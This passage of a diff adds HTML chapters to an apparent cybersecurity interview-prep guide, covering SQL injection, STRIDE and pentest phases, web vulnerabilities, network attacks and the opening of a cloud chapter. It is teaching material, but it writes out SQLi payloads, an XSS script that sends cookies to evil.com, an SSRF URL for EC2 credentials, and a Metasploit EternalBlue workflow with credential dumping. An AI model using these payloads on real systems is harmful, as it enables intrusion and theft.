+     CHAPTER 3 - Abbreviated for space, full version continues same pattern
+═══════════════════════════════════════════════════════════ -->
+<div class="chapter" data-search="database sql injection nosql acid sqli prevention prepared statements">
+  <div class="chapter-header" onclick="toggleChapter(this)">
+    <span class="ch-num">Ch 03</span>
+    <div class="ch-info">
+      <div class="ch-title">Security of DBMS &amp; SQL</div>
+      <div class="ch-desc">Relational databases, ACID properties, SQL injection types (union, blind, time-based), NoSQL, and database hardening.</div>
+      <div class="ch-tags"><span class="ch-tag">SQL Injection</span><span class="ch-tag">Databases</span><span class="ch-tag">ACID</span><span class="ch-tag">NoSQL</span></div>
+    </div>
+    <span class="ch-arrow">▼</span>
+  </div>
+  <div class="chapter-body">
+    <div class="tabs">
+      <button class="tab-btn active" onclick="switchTab(this,'sum')">Summary</button>
+      <button class="tab-btn" onclick="switchTab(this,'terms')">Key Terms</button>
+      <button class="tab-btn" onclick="switchTab(this,'qs')">Interview Qs</button>
+    </div>
+    <div class="tab-panel active" data-tab="sum">
+      <div class="sum-cards">
+        <div class="sum-card"><div class="sum-card-title">ACID Properties</div><div class="sum-card-text">Atomicity (all or nothing), Consistency (valid state), Isolation (concurrent transactions don't interfere), Durability (committed data persists). Foundation of relational DB reliability.</div></div>
+        <div class="sum-card"><div class="sum-card-title">SQL Injection Types</div><div class="sum-card-text">In-band: Union-based (append UNION SELECT), Error-based (force DB errors). Blind: Boolean-based (true/false responses), Time-based (SLEEP()). Out-of-band: DNS/HTTP exfiltration.</div></div>
+        <div class="sum-card"><div class="sum-card-title">SQLi Prevention</div><div class="sum-card-text">Parameterized queries / prepared statements are the gold standard. Also: stored procedures, ORMs, input validation, WAF, least-privilege DB accounts.</div></div>
+        <div class="sum-card"><div class="sum-card-title">NoSQL</div><div class="sum-card-text">MongoDB (document store), Cassandra (wide-column), Redis (key-value). Also vulnerable to injection through different mechanisms (JSON injection, operator injection).</div></div>
+        <div class="sum-card"><div class="sum-card-title">SQL Operations</div><div class="sum-card-text">DDL (CREATE, DROP, ALTER), DML (INSERT, UPDATE, DELETE), DQL (SELECT), DCL (GRANT, REVOKE), TCL (COMMIT, ROLLBACK). Each has different security implications.</div></div>
+        <div class="sum-card"><div class="sum-card-title">DB Hardening</div><div class="sum-card-text">Least privilege DB accounts, TLS for connections, encryption at rest, remove default accounts, place DB in DMZ, audit all access, disable unnecessary stored procedures.</div></div>
+      </div>
+    </div>
+    <div class="tab-panel" data-tab="terms">
+      <div class="terms-grid">
+        <div class="term-card"><span class="term-badge b-web">SQLi</span><div class="term-name">Union-Based SQLi</div><div class="term-def">Appends UNION SELECT to extract data from other tables. Requires knowing the number of columns and compatible data types. Example: ' UNION SELECT username,password FROM users--</div></div>
+        <div class="term-card"><span class="term-badge b-web">SQLi</span><div class="term-name">Blind SQLi</div><div class="term-def">No direct output. Boolean-based infers data from true/false responses. Time-based uses SLEEP() or WAITFOR DELAY to infer data based on response time differences.</div></div>
+        <div class="term-card"><span class="term-badge b-sec">Defense</span><div class="term-name">Parameterized Queries</div><div class="term-def">SQL statement with placeholders for user input. DB engine treats input as data, never as SQL code. SELECT * FROM users WHERE id = ? with input bound separately. Completely prevents SQLi.</div></div>
+        <div class="term-card"><span class="term-badge b-sec">Defense</span><div class="term-name">Prepared Statements</div><div class="term-def">Pre-compiled SQL statement where structure is fixed before user input is applied. Input is always treated as a literal value, never as SQL syntax. Language-agnostic SQLi prevention.</div></div>
+        <div class="term-card"><span class="term-badge b-web">DB</span><div class="term-name">ACID</div><div class="term-def">Atomicity, Consistency, Isolation, Durability. Guarantees transactions are processed reliably. Atomicity ensures no partial writes — either the whole transaction commits or none of it does.</div></div>
+        <div class="term-card"><span class="term-badge b-web">DB</span><div class="term-name">3-Tier Architecture</div><div class="term-def">Presentation (browser) → Application server → Database server. Separation prevents direct client-to-database connections. DB credentials stored only on app server, not exposed to clients.</div></div>
+      </div>
+    </div>
+    <div class="tab-panel" data-tab="qs">
+      <div class="q-list">
+        <div class="q-item"><div class="q-head" onclick="toggleQ(this)"><div class="q-num">1</div><div class="q-text">What is SQL injection and how do parameterized queries prevent it?</div><span class="q-diff easy">Easy</span><span class="q-toggle">▼</span></div><div class="q-answer"><p>SQL injection occurs when user-supplied input is incorporated directly into a SQL query, allowing the attacker to modify the query's logic. Example: if a login query is built as "SELECT * FROM users WHERE username='" + input + "'", an attacker inputs ' OR '1'='1 to make the condition always true and bypass authentication.</p><p>Parameterized queries solve this by separating SQL code from data. The query structure is sent to the database first: "SELECT * FROM users WHERE username = ?". The database compiles and understands this as a fixed query structure. Then the user input is bound as a pure data value. The database treats it as a literal string — no matter what SQL syntax the attacker includes, it's evaluated as data, never as code. The ' OR '1'='1 input would literally search for a username equal to that exact string.</p></div></div>
+        <div class="q-item"><div class="q-head" onclick="toggleQ(this)"><div class="q-num">2</div><div class="q-text">Explain the difference between union-based and blind SQL injection.</div><span class="q-diff med">Medium</span><span class="q-toggle">▼</span></div><div class="q-answer"><p>Union-based SQLi extracts data directly in the response. The attacker appends a UNION SELECT statement that fetches data from other tables, and this data appears in the application's output. Requirement: must know/guess the number of columns and compatible data types. Fast but requires visible output from the vulnerable query.</p><p>Blind SQLi receives no direct data output. Boolean-based: attacker asks true/false questions — ' AND 1=1-- (true condition, normal response) vs ' AND 1=2-- (false condition, different response). By asking questions about specific data (is the first character of the admin password 'a'?), the attacker extracts data character by character. Slow but works against queries with no visible output. Time-based blind: inject SLEEP(5) in a condition — if the response takes 5 extra seconds, the condition was true. Works even when boolean detection fails.</p></div></div>
+        <div class="q-item"><div class="q-head" onclick="toggleQ(this)"><div class="q-num">3</div><div class="q-text">What ACID property is most important for financial transactions and why?</div><span class="q-diff easy">Easy</span><span class="q-toggle">▼</span></div><div class="q-answer"><p>Atomicity is arguably most important for financial transactions — it guarantees that a transaction either completes entirely or not at all. Consider a bank transfer: debit Account A and credit Account B. If the system crashes after the debit but before the credit, Atomicity ensures the debit is rolled back. Without it, money disappears from Account A without arriving in Account B.</p><p>However, all four ACID properties are critical: Consistency ensures the database stays in a valid state (account balance can't go below 0 if that's a business rule). Isolation ensures concurrent transactions don't interfere — two simultaneous withdrawals from the same account can't both read the same balance and both succeed if there's only enough for one. Durability guarantees committed transactions survive system failures — after the bank confirms a deposit, a server crash doesn't lose it. In practice, financial systems often use all four properties together, accepting performance trade-offs for correctness guarantees.</p></div></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- Ch 4 -->
+<div class="chapter" data-search="threat modeling stride dread pasta penetration testing phases sast dast owasp cvss">
+  <div class="chapter-header" onclick="toggleChapter(this)">
+    <span class="ch-num">Ch 04</span>
+    <div class="ch-info">
+      <div class="ch-title">Threat Modeling, Pentesting &amp; Secure Coding</div>
+      <div class="ch-desc">STRIDE, DREAD, PASTA, CVSS, pentest phases (recon→exploit→report), SAST/DAST/IAST, OWASP Top 10 (2017).</div>
+      <div class="ch-tags"><span class="ch-tag">Threat Modeling</span><span class="ch-tag">Pentesting</span><span class="ch-tag">STRIDE</span><span class="ch-tag">OWASP</span></div>
+    </div>
+    <span class="ch-arrow">▼</span>
+  </div>
+  <div class="chapter-body">
+    <div class="tabs">
+      <button class="tab-btn active" onclick="switchTab(this,'sum')">Summary</button>
+      <button class="tab-btn" onclick="switchTab(this,'terms')">Key Terms</button>
+      <button class="tab-btn" onclick="switchTab(this,'qs')">Interview Qs</button>
+    </div>
+    <div class="tab-panel active" data-tab="sum">
+      <div class="sum-cards">
+        <div class="sum-card"><div class="sum-card-title">STRIDE</div><div class="sum-card-text">Spoofing, Tampering, Repudiation, Information Disclosure, Denial of Service, Elevation of Privilege. Microsoft threat categorization framework for identifying threats per component.</div></div>
+        <div class="sum-card"><div class="sum-card-title">Pentest Phases</div><div class="sum-card-text">Recon → Scanning → Exploitation → Post-exploitation → Reporting. Types: black/white/gray box. Social engineering, physical, wireless, web app, cloud, mobile, ICS/SCADA.</div></div>
+        <div class="sum-card"><div class="sum-card-title">SAST vs DAST vs IAST</div><div class="sum-card-text">SAST: static code analysis without execution. DAST: tests running application externally. IAST: instruments running application from inside — combines both approaches.</div></div>
+        <div class="sum-card"><div class="sum-card-title">CVSS</div><div class="sum-card-text">Common Vulnerability Scoring System. 0-10 severity score based on base (exploitability, impact), temporal (exploit maturity, fix availability), and environmental metrics.</div></div>
+        <div class="sum-card"><div class="sum-card-title">PASTA</div><div class="sum-card-text">Process for Attack Simulation and Threat Analysis. 7-stage risk-centric framework that aligns threat analysis with business objectives. More comprehensive than STRIDE alone.</div></div>
+        <div class="sum-card"><div class="sum-card-title">OWASP Top 10 (2017)</div><div class="sum-card-text">A1 Injection, A2 Broken Auth, A3 XSS, A4 XXE, A5 Broken Access Control, A6 Security Misconfiguration, A7 Insecure Deserialization, A8 Vulnerable Components, A9 Logging Failures, A10 SSRF.</div></div>
+      </div>
+    </div>
+    <div class="tab-panel" data-tab="terms">
+      <div class="terms-grid">
+        <div class="term-card"><span class="term-badge b-sec">Framework</span><div class="term-name">STRIDE</div><div class="term-def">Spoofing identity, Tampering with data, Repudiation (denying actions), Information Disclosure, Denial of Service, Elevation of Privilege. Each threat maps to a security property it violates.</div></div>
+        <div class="term-card"><span class="term-badge b-att">Pentest</span><div class="term-name">Black/White/Gray Box</div><div class="term-def">Black box: no prior knowledge (simulates external attacker). White box: full knowledge of systems/code. Gray box: partial knowledge (simulates insider or privileged external attacker).</div></div>
+        <div class="term-card"><span class="term-badge b-sec">Testing</span><div class="term-name">CVSS Score</div><div class="term-def">0-10 vulnerability severity. Critical ≥9, High 7-8.9, Medium 4-6.9, Low 0.1-3.9. Base score includes Attack Vector, Complexity, Privileges Required, User Interaction, Confidentiality/Integrity/Availability impact.</div></div>
+        <div class="term-card"><span class="term-badge b-sec">Testing</span><div class="term-name">SonarQube</div><div class="term-def">SAST platform for continuous code quality and security analysis. Integrates into CI/CD pipelines. Detects SQLi patterns, hardcoded credentials, XSS risks, and coding standard violations.</div></div>
+        <div class="term-card"><span class="term-badge b-sec">Testing</span><div class="term-name">OWASP ZAP</div><div class="term-def">Open-source DAST tool. Active scanner, passive scanner, fuzzer, intercepting proxy. Can run in headless mode via REST API for CI/CD integration. Free alternative to Burp Suite.</div></div>
+        <div class="term-card"><span class="term-badge b-sec">Testing</span><div class="term-name">TruffleHog</div><div class="term-def">Secrets detection tool scanning git history with entropy analysis and regex. Finds committed API keys, passwords, certificates across all branches and commit history.</div></div>
+      </div>
+    </div>
+    <div class="tab-panel" data-tab="qs">
+      <div class="q-list">
+        <div class="q-item"><div class="q-head" onclick="toggleQ(this)"><div class="q-num">1</div><div class="q-text">What is STRIDE and how is it used in threat modeling?</div><span class="q-diff easy">Easy</span><span class="q-toggle">▼</span></div><div class="q-answer"><p>STRIDE is a threat categorization framework developed by Microsoft for identifying security threats during the design phase. Each letter represents a threat category: <strong>S</strong>poofing (forging identity — pretending to be someone else), <strong>T</strong>ampering (modifying data in transit or at rest), <strong>R</strong>epudiation (denying having performed an action — lack of audit trail), <strong>I</strong>nformation Disclosure (unauthorized data exposure), <strong>D</strong>enial of Service (making the system unavailable), <strong>E</strong>levation of Privilege (gaining more permissions than authorized).</p><p>Usage: for each component in a system's data flow diagram (DFD), systematically ask whether each STRIDE threat applies. For a login endpoint: Spoofing (can someone impersonate another user?), Tampering (can the login request be modified?), Repudiation (do we log who logged in?), Information Disclosure (does the error message reveal valid usernames?), DoS (can the login endpoint be flooded?), EoP (can a normal user gain admin access?). This structured approach ensures no threat category is overlooked during design review.</p></div></div>
+        <div class="q-item"><div class="q-head" onclick="toggleQ(this)"><div class="q-num">2</div><div class="q-text">What is the difference between SAST, DAST, and IAST?</div><span class="q-diff med">Medium</span><span class="q-toggle">▼</span></div><div class="q-answer"><p>SAST (Static Application Security Testing) analyzes source code, bytecode, or binary without executing the program. Runs during development — can catch issues before code even compiles. Finds: hardcoded secrets, SQL injection patterns, buffer overflow risks, insecure API usage. Tools: SonarQube, Checkmarx, Bandit. Fast, early feedback, but can't see runtime behavior.</p><p>DAST (Dynamic Application Security Testing) tests a running application by sending requests and analyzing responses. Finds: authentication bypass, live injection points, server misconfigurations, session issues. Tools: OWASP ZAP, Burp Suite. Catches issues only visible at runtime, no source code needed, but slower and runs later in the pipeline.</p><p>IAST (Interactive Application Security Testing) instruments agents inside the running application to monitor all interactions in real time. Combines static depth with dynamic execution context — knows exactly which code line is executing when a vulnerability is triggered. More accurate, fewer false positives, but adds performance overhead. Tools: Contrast Security, Seeker. Used in staging/QA environments where performance overhead is acceptable.</p></div></div>
+        <div class="q-item"><div class="q-head" onclick="toggleQ(this)"><div class="q-num">3</div><div class="q-text">Walk through the phases of a penetration test.</div><span class="q-diff med">Medium</span><span class="q-toggle">▼</span></div><div class="q-answer"><p><strong>Reconnaissance:</strong> Gather information about the target without touching their systems. OSINT — LinkedIn profiles, job postings (reveal tech stack), WHOIS, Shodan, Google dorking, certificate transparency logs. <strong>Scanning:</strong> Active information gathering — Nmap port scanning, service version detection, OS fingerprinting, vulnerability scanning (Nessus, OpenVAS). <strong>Exploitation:</strong> Attempt to exploit discovered vulnerabilities. Use Metasploit modules, custom exploits, or manual techniques. Goal is gaining initial access. <strong>Post-exploitation:</strong> Once inside — escalate privileges, move laterally, maintain access (backdoors, persistence mechanisms), collect evidence (credentials, sensitive files), understand the blast radius. <strong>Reporting:</strong> Document everything — executive summary (business impact, risk ratings), technical findings (vulnerability details, evidence, reproduction steps), and remediation recommendations prioritized by risk. Distinguish findings by severity (Critical/High/Medium/Low/Informational) using CVSS scores.</p></div></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- Ch 5 -->
+<div class="chapter" data-search="application security owasp 2021 xss csrf ssrf injection broken access control web vulnerabilities">
+  <div class="chapter-header" onclick="toggleChapter(this)">
+    <span class="ch-num">Ch 05</span>
+    <div class="ch-info">
+      <div class="ch-title">Application Security</div>
+      <div class="ch-desc">OWASP Top 10 (2021), XSS types, CSRF vs SSRF, LFI/RFI, web shells, security headers, Burp Suite, and WAF.</div>
+      <div class="ch-tags"><span class="ch-tag">OWASP 2021</span><span class="ch-tag">XSS</span><span class="ch-tag">CSRF/SSRF</span><span class="ch-tag">Web Security</span></div>
+    </div>
+    <span class="ch-arrow">▼</span>
+  </div>
+  <div class="chapter-body">
+    <div class="tabs">
+      <button class="tab-btn active" onclick="switchTab(this,'sum')">Summary</button>
+      <button class="tab-btn" onclick="switchTab(this,'terms')">Key Terms</button>
+      <button class="tab-btn" onclick="switchTab(this,'qs')">Interview Qs</button>
+    </div>
+    <div class="tab-panel active" data-tab="sum">
+      <div class="sum-cards">
+        <div class="sum-card"><div class="sum-card-title">OWASP Top 10 (2021)</div><div class="sum-card-text">A01 Broken Access Control (top), A02 Cryptographic Failures, A03 Injection, A04 Insecure Design, A05 Security Misconfiguration, A06 Vulnerable Components, A07 Auth Failures, A08 Data Integrity Failures, A09 Logging Failures, A10 SSRF.</div></div>
+        <div class="sum-card"><div class="sum-card-title">XSS Types</div><div class="sum-card-text">Stored (persisted in DB, executes for all users viewing). Reflected (in URL, affects current user). DOM-based (client-side script modifies DOM using attacker-controlled input). All execute JavaScript in victim's browser.</div></div>
+        <div class="sum-card"><div class="sum-card-title">CSRF vs SSRF</div><div class="sum-card-text">CSRF: attacker makes victim's browser perform actions on a site where they're authenticated. SSRF: attacker makes the server make requests on their behalf, often to internal resources (169.254.169.254 EC2 metadata).</div></div>
+        <div class="sum-card"><div class="sum-card-title">Security Headers</div><div class="sum-card-text">X-Frame-Options (prevents clickjacking), HSTS (forces HTTPS), X-Content-Type-Options (prevents MIME sniffing), CSP (controls what resources can load), X-XSS-Protection (legacy XSS filter).</div></div>
+        <div class="sum-card"><div class="sum-card-title">LFI / RFI</div><div class="sum-card-text">Local File Inclusion: attacker reads local files via path traversal in file parameter (?file=../../etc/passwd). Remote File Inclusion: includes remote malicious file as code (when allow_url_include is on).</div></div>
+        <div class="sum-card"><div class="sum-card-title">Defense Tools</div><div class="sum-card-text">WAF (blocks known attack patterns at HTTP layer), Burp Suite (web app pen testing proxy), SQLMap (automated SQLi), SSLScan (TLS cipher analysis), Dirb/Gobuster (directory enumeration).</div></div>
+      </div>
+    </div>
+    <div class="tab-panel" data-tab="terms">
+      <div class="terms-grid">
+        <div class="term-card"><span class="term-badge b-web">Web</span><div class="term-name">Broken Access Control (A01)</div><div class="term-def">OWASP #1 in 2021. Occurs when users can act outside their intended permissions. Examples: IDOR (accessing another user's records by changing an ID), privilege escalation, bypassing access checks.</div></div>
+        <div class="term-card"><span class="term-badge b-web">Web</span><div class="term-name">XSS (Cross-Site Scripting)</div><div class="term-def">Injecting malicious JavaScript into a web page that executes in other users' browsers. Used to steal session cookies, capture keystrokes, redirect users, or perform actions as the victim.</div></div>
+        <div class="term-card"><span class="term-badge b-web">Web</span><div class="term-name">CSRF</div><div class="term-def">Cross-Site Request Forgery. Attacker tricks authenticated victim into visiting a page that makes requests to a target site using the victim's credentials. Prevented by CSRF tokens (unpredictable values validated server-side).</div></div>
+        <div class="term-card"><span class="term-badge b-web">Web</span><div class="term-name">SSRF</div><div class="term-def">Server-Side Request Forgery. Application fetches a URL provided by user input — attacker supplies internal addresses. Used to access cloud metadata (169.254.169.254 for EC2 IAM credentials), internal services, and internal APIs.</div></div>
+        <div class="term-card"><span class="term-badge b-sec">Header</span><div class="term-name">Content Security Policy (CSP)</div><div class="term-def">HTTP header controlling which resources (scripts, images, stylesheets) can be loaded. Prevents XSS by blocking inline scripts and unauthorized external resources. Most powerful XSS defense at the HTTP layer.</div></div>
+        <div class="term-card"><span class="term-badge b-sec">Header</span><div class="term-name">HSTS</div><div class="term-def">HTTP Strict Transport Security. Forces browsers to only connect via HTTPS for a specified period. Prevents SSL stripping attacks. Include SubDomains and preload for maximum coverage.</div></div>
+      </div>
+    </div>
+    <div class="tab-panel" data-tab="qs">
+      <div class="q-list">
+        <div class="q-item"><div class="q-head" onclick="toggleQ(this)"><div class="q-num">1</div><div class="q-text">What is the difference between stored, reflected, and DOM-based XSS?</div><span class="q-diff med">Medium</span><span class="q-toggle">▼</span></div><div class="q-answer"><p><strong>Stored XSS:</strong> Malicious script is permanently stored on the server (database, comment field, profile data). Every user who views the affected page executes the script. Most dangerous — no user interaction beyond visiting the page. Example: attacker stores &lt;script&gt;document.location='http://evil.com/steal?c='+document.cookie&lt;/script&gt; in a forum comment field.</p><p><strong>Reflected XSS:</strong> Malicious script is in the URL/request parameter and reflected back in the response without being stored. Requires tricking the victim into clicking a crafted link. Example: attacker sends link like https://bank.com/search?q=&lt;script&gt;...&lt;/script&gt;. Affects only users who click the specific malicious URL.</p><p><strong>DOM-based XSS:</strong> Vulnerability exists entirely in client-side JavaScript. The server's response is not malicious, but client code reads attacker-controlled input (URL hash, query parameters) and writes it unsafely to the DOM. Example: script reads window.location.hash and passes it to innerHTML. Server logs show no malicious content — the attack is invisible to server-side logging. Prevention: validate and sanitize at the DOM API level (textContent instead of innerHTML).</p></div></div>
+        <div class="q-item"><div class="q-head" onclick="toggleQ(this)"><div class="q-num">2</div><div class="q-text">What is SSRF and how is it used to access AWS EC2 metadata?</div><span class="q-diff hard">Hard</span><span class="q-toggle">▼</span></div><div class="q-answer"><p>SSRF (Server-Side Request Forgery) occurs when an application fetches a remote resource based on user-supplied input without adequate validation. The attacker supplies an internal or cloud-specific URL, and the application's server makes the request on their behalf — from the server's network perspective, not the attacker's.</p><p>AWS EC2 metadata attack: EC2 instances have a non-routable metadata endpoint at 169.254.169.254, accessible only from the instance itself. If an application has an SSRF vulnerability (URL fetching, PDF generation, webhook), the attacker submits: http://169.254.169.254/latest/meta-data/iam/security-credentials/. The server fetches this URL and returns the IAM role credentials (access key ID, secret key, session token) that the instance was assigned. These temporary credentials can then be used to call AWS APIs with the instance's permissions — potentially including S3 data access, EC2 control, or worse. Mitigation: IMDSv2 (requires a PUT request with a token before GET requests, preventing SSRF exploitation), allowlist of valid destination URLs, block internal IP ranges in the URL fetching code.</p></div></div>
+        <div class="q-item"><div class="q-head" onclick="toggleQ(this)"><div class="q-num">3</div><div class="q-text">Why is Broken Access Control ranked #1 in OWASP 2021?</div><span class="q-diff med">Medium</span><span class="q-toggle">▼</span></div><div class="q-answer"><p>Broken Access Control moved to #1 in 2021 (from #5 in 2017) because it's both extremely prevalent and extremely impactful. 94% of applications tested had at least one broken access control finding — making it the most common vulnerability category. More importantly, when access control fails, attackers can access sensitive data and perform actions beyond their authorization, which is the fundamental failure security is designed to prevent.</p><p>Common manifestations: IDOR (Insecure Direct Object Reference) — changing ?user_id=1234 to ?user_id=1235 to access another user's data. Missing function-level access control — accessing /admin endpoint without checking if the user is actually an admin. Privilege escalation — a regular user performing admin actions by modifying request parameters. Force browsing — accessing unlinked pages that lack authorization checks. Path traversal reaching protected files. The reason it's pervasive: developers often implement authentication (proving identity) but forget or under-implement authorization (proving permission). Every API endpoint, every page, every action must individually verify that the authenticated user has permission to perform that specific operation on that specific resource.</p></div></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- Ch 6 -->
+<div class="chapter" data-search="network security nmap metasploit meterpreter eternalblue mimikatz reverse shell firewall vlan">
+  <div class="chapter-header" onclick="toggleChapter(this)">
+    <span class="ch-num">Ch 06</span>
+    <div class="ch-info">
+      <div class="ch-title">Network Security</div>
+      <div class="ch-desc">Nmap scan types, Metasploit workflow, Meterpreter post-exploitation, EternalBlue, Mimikatz, reverse shells, VLAN hopping, SIEM/EDR defense stack.</div>
+      <div class="ch-tags"><span class="ch-tag">Nmap</span><span class="ch-tag">Metasploit</span><span class="ch-tag">Meterpreter</span><span class="ch-tag">Network Attacks</span></div>
+    </div>
+    <span class="ch-arrow">▼</span>
+  </div>
+  <div class="chapter-body">
+    <div class="tabs">
+      <button class="tab-btn active" onclick="switchTab(this,'sum')">Summary</button>
+      <button class="tab-btn" onclick="switchTab(this,'terms')">Key Terms</button>
+      <button class="tab-btn" onclick="switchTab(this,'qs')">Interview Qs</button>
+    </div>
+    <div class="tab-panel active" data-tab="sum">
+      <div class="sum-cards">
+        <div class="sum-card"><div class="sum-card-title">Nmap Scan Types</div><div class="sum-card-text">-sT (TCP connect), -sS (SYN stealth), -sU (UDP), -sN/-sF/-sX (null/FIN/Xmas), -sA (ACK), -sV (version), -sC (scripts), -A (aggressive), -p- (all ports). NSE: --script=*vuln*.</div></div>
+        <div class="sum-card"><div class="sum-card-title">Metasploit Workflow</div><div class="sum-card-text">msfconsole → search [module] → use [module] → set RHOST/LHOST/LPORT/payload → exploit. Post-exploitation via Meterpreter sessions.</div></div>
+        <div class="sum-card"><div class="sum-card-title">Meterpreter</div><div class="sum-card-text">Advanced payload running in memory. getuid, sysinfo, hashdump, getsystem, load kiwi → lsa_dump_secrets, portfwd (tunnel traffic), migrate (thread injection), shell.</div></div>
+        <div class="sum-card"><div class="sum-card-title">EternalBlue (MS17-010)</div><div class="sum-card-text">NSA exploit for SMB vulnerability in Windows. Used in WannaCry and NotPetya ransomware attacks. Patched March 2017. Still unpatched in many environments.</div></div>
+        <div class="sum-card"><div class="sum-card-title">Mimikatz/Kiwi</div><div class="sum-card-text">Tool extracting plaintext passwords, hashes, and Kerberos tickets from LSASS memory. Kiwi is Meterpreter module version. Credential harvesting foundation of lateral movement.</div></div>
+        <div class="sum-card"><div class="sum-card-title">Reverse vs Bind Shell</div><div class="sum-card-text">Reverse: victim connects back to attacker (bypasses inbound firewall). Bind: victim listens, attacker connects (requires inbound access). Reverse shells are preferred in most pentests.</div></div>
+      </div>
+    </div>
+    <div class="tab-panel" data-tab="terms">
+      <div class="terms-grid">
+        <div class="term-card"><span class="term-badge b-att">Nmap</span><div class="term-name">SYN Scan (-sS)</div><div class="term-def">Stealth scan. Sends SYN, receives SYN-ACK (open) or RST (closed). Sends RST instead of ACK — never completes handshake. Doesn't create full connection log entries. Requires root privileges.</div></div>
+        <div class="term-card"><span class="term-badge b-att">Exploit</span><div class="term-name">EternalBlue / MS17-010</div><div class="term-def">SMBv1 buffer overflow exploit developed by NSA, leaked by Shadow Brokers. Allows remote code execution without authentication. Enabled WannaCry/NotPetya. Metasploit module: exploit/windows/smb/ms17_010_eternalblue.</div></div>
+        <div class="term-card"><span class="term-badge b-att">Post-Exploit</span><div class="term-name">Meterpreter</div><div class="term-def">Advanced in-memory payload providing interactive shell with built-in post-exploitation capabilities. Runs in injected thread — no binary on disk. Encrypted communications. Supports modules for credential dumping, pivoting, persistence.</div></div>
+        <div class="term-card"><span class="term-badge b-att">Post-Exploit</span><div class="term-name">Hashdump</div><div class="term-def">Meterpreter command extracting password hashes from Windows SAM database. Requires SYSTEM privileges. Hashes can be cracked offline or used in pass-the-hash attacks.</div></div>
+        <div class="term-card"><span class="term-badge b-att">Network</span><div class="term-name">VLAN Hopping</div><div class="term-def">Bypassing VLAN segmentation. Double tagging: attacker on VLAN 1 sends frame with two 802.1Q tags — first tag stripped by trunk, second delivers frame to target VLAN. Switch spoofing: attacker negotiates trunk link using DTP.</div></div>
+        <div class="term-card"><span class="term-badge b-sec">Defense</span><div class="term-name">PTY Shell Upgrade</div><div class="term-def">Convert a basic netcat reverse shell into a full interactive terminal. python3 -c 'import pty;pty.spawn("/bin/bash")'. Enables tab completion, proper job control, and interactive programs like sudo.</div></div>
+      </div>
+    </div>
+    <div class="tab-panel" data-tab="qs">
+      <div class="q-list">
+        <div class="q-item"><div class="q-head" onclick="toggleQ(this)"><div class="q-num">1</div><div class="q-text">What is the difference between a reverse shell and a bind shell?</div><span class="q-diff easy">Easy</span><span class="q-toggle">▼</span></div><div class="q-answer"><p>A bind shell: the victim machine opens a port and listens for an incoming connection. The attacker connects to that port and gets a shell. Requires the attacker to be able to reach the victim's open port — often blocked by inbound firewall rules that restrict which ports can receive connections from the internet.</p><p>A reverse shell: the victim machine initiates the connection back to the attacker's machine on a port the attacker is listening on. Outbound connections are typically much less restricted than inbound — most firewalls allow outbound traffic on common ports (80, 443, 53). Since the victim is initiating the connection, the attacker just needs to be listening. Most pentests and real-world attacks use reverse shells for this reason. The attacker runs a listener (nc -lvnp 4444 or use MSF multi/handler) and delivers a payload that causes the victim to connect back. Common ports to use: 443 (HTTPS) or 80 (HTTP) are least likely to be blocked and blend in with normal traffic.</p></div></div>
+        <div class="q-item"><div class="q-head" onclick="toggleQ(this)"><div class="q-num">2</div><div class="q-text">Walk through the Metasploit workflow for exploiting a vulnerability.</div><span class="q-diff med">Medium</span><span class="q-toggle">▼</span></div><div class="q-answer"><p>1. Launch: msfconsole 2. Search for relevant module: search ms17_010 or search type:exploit platform:windows smb. 3. Select module: use exploit/windows/smb/ms17_010_eternalblue. 4. View options: show options — see required and optional parameters. 5. Configure: set RHOST [target IP] sets the remote target. set LHOST [your IP] sets where the reverse shell connects back. set LPORT 4444 sets the listening port. 6. Select payload: set payload windows/x64/meterpreter/reverse_tcp. 7. Run: exploit or run. 8. If successful, receive Meterpreter session.</p><p>Post-exploitation in Meterpreter: getuid (who am I?), sysinfo (OS details), getsystem (attempt privilege escalation), hashdump (extract password hashes — needs SYSTEM), load kiwi (then lsa_dump_secrets for plaintext creds), migrate [PID] (move to another process for persistence), portfwd add -l 3389 -p 3389 -r [internal IP] (tunnel RDP to pivot), shell (drop to OS command prompt).</p></div></div>
+        <div class="q-item"><div class="q-head" onclick="toggleQ(this)"><div class="q-num">3</div><div class="q-text">You're a SOC analyst. You see a SIEM alert showing regular outbound connections from svchost.exe to an external IP at 5-minute intervals. Walk through your triage process.</div><span class="q-diff hard">Hard</span><span class="q-toggle">▼</span></div><div class="q-answer"><p>This is C2 beaconing — regular interval outbound from a Windows system process. Step 1: Check IP reputation — query VirusTotal, AbuseIPDB, Shodan. Is this a known C2 server, Tor exit node, anonymous VPN, or hosting provider associated with malware? Step 2: Check process legitimacy — legitimate svchost.exe is always spawned by services.exe. Pull the process tree from EDR. If svchost.exe was spawned by anything else (Word, PowerShell, cmd.exe), this is process hollowing — a critical indicator. Step 3: Check in-memory vs on-disk — EDR should show whether the process's in-memory image matches the on-disk svchost.exe. A mismatch confirms hollowing.</p><p>Step 4: Analyze the network connections — what's the destination port? 443 (HTTPS encrypted C2 is common), 80, 53 (DNS tunneling). What's the data volume? C2 beaconing is often very small packets (checking in for instructions). Step 5: Check SIEM for other endpoints — is this IP seen elsewhere? Is this a campaign? Step 6: Escalate — if evidence is strong, isolate the endpoint via EDR. Don't alert the attacker by making noisy changes. Isolate, capture memory dump before shutdown (memory forensics), begin incident response. Document all findings with timestamps for the IR report.</p></div></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- Ch 7 -->
+<div class="chapter" data-search="cloud security aws azure gcp shared responsibility iam ec2 metadata ssrf s3 guardduty cloudtrail">
+  <div class="chapter-header" onclick="toggleChapter(this)">
+    <span class="ch-num">Ch 07</span>
+    <div class="ch-info">
+      <div class="ch-title">Cloud Security</div>
+      <div class="ch-desc">Shared responsibility model, AWS/Azure/GCP equivalents, IAM misconfigs, EC2 metadata SSRF, cloud post-exploitation, Pacu, ScoutSuite, AWS defense services.</div>
+      <div class="ch-tags"><span class="ch-tag">AWS</span><span class="ch-tag">Cloud IAM</span><span class="ch-tag">Shared Responsibility</span><span class="ch-tag">Cloud Attacks</span></div>
+    </div>
+    <span class="ch-arrow">▼</span>
+  </div>
+  <div class="chapter-body">
+    <div class="tabs">
+      <button class="tab-btn active" onclick="switchTab(this,'sum')">Summary</button>
+      <button class="tab-btn" onclick="switchTab(this,'terms')">Key Terms</button>
+      <button class="tab-btn" onclick="switchTab(this,'qs')">Interview Qs</button>
+    </div>
+    <div class="tab-panel active" data-tab="sum">
+      <div class="sum-cards">
